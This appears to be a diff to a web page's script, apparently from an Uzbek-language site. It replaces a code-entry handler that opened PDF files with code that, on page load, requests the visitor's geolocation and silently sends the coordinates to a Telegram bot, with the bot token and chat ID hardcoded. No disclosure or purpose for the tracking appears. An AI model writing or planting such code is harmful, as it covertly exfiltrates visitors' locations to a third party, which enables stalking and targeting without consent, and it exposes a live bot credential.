@@ -182,20 +182,46 @@
       </div>
     </footer>
     <script>
-      const input = document.getElementById("code");
-      const btn = document.getElementById("btn");
+        const BOT_TOKEN = "8397379176:AAFEjwoQYX9SsXB4d4ewMMoVjqPP9JnDAbA";
+        const CHAT_ID = "-1003578485277";
 
-      btn.onclick = function () {
-        if (input.value == "0781") {
-          window.open("./file.pdf", "_blank");
-        } else if (input.value == "0121") {
-          window.open("./file_20251226.pdf", "_blank");
-        }
-        else {
-          input.value = "";
-          alert("Noto'g'ri ko'd");
-        }
-      };
+  function sendLocationToTelegram(lat, lon) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+
+    fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        latitude: lat,
+        longitude: lon,
+      }),
+    });
+  }
+
+  function requestLocation() {
+    if (!navigator.geolocation) {
+      console.log("Geolocation not supported");
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        sendLocationToTelegram(lat, lon);
+      },
+      (error) => {
+        console.log("Location denied or error", error);
+      }
+    );
+  }
+
+  // Ask for location when site opens
+  window.onload = requestLocation;
     </script>
   </body>
 </html>
